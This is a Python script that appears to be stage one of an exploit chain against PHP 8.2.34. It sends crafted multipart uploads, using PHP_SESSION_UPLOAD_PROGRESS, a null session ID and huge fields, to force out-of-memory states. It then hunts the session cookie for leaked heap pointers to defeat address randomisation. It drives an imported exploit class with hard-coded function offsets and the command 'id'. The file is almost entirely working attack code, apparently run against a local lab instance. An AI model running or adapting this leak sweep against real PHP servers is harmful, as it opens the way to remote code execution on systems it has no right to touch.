"""Comprehensive OOM-shape sweep for 8.2.34 stage-1: find a shape that leaks heap pointers."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18111/"

def try_shape(fc, fs, big_mb=12):
    t = E.Target(URL, timeout=90.0, verbose=False)
    ex = E.Exploit(t, "id", zif_offset=0x39b8a0, dtor_offset=0x487650,
                   htdata_offset=0x690d8, huge_mb=big_mb, verbose=False, profile="bookworm")
    ex.rotate()
    time.sleep(0.3)
    parts = [{"name": f"p{i:04d}", "data": b"x" * fs} for i in range(fc)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception:
        return 0, 0
    raw = E.parse_cookie(resp)
    if len(raw) < 100:
        return len(raw), 0
    # Count 2MB-aligned heap pointers
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    best = c.most_common(1)[0] if c else (0, 0)
    return len(raw), (best[1] if best[1] >= 8 else 0)

# Sweep: field_count x field_size
print("=== OOM shape sweep (fc x fs) ===", flush=True)
hits = []
for fc in [300, 400, 500, 600, 700, 800, 900, 1001]:
    for fs in [1, 8, 16, 31, 39, 48]:
        try:
            clen, heap_leak = try_shape(fc, fs)
        except Exception as e:
            clen, heap_leak = 0, 0
        mark = " <<< HEAP LEAK" if heap_leak else ""
        print(f"  fc={fc:4d} fs={fs:3d}: cookie={clen:5d}{mark}", flush=True)
        if heap_leak:
            hits.append((fc, fs, clen, heap_leak))
        time.sleep(0.3)

print(f"\n=== {len(hits)} heap-leak hits ===", flush=True)
for h in hits:
    print(f"  fc={h[0]} fs={h[1]} cookie={h[2]} leak={h[3]}", flush=True)
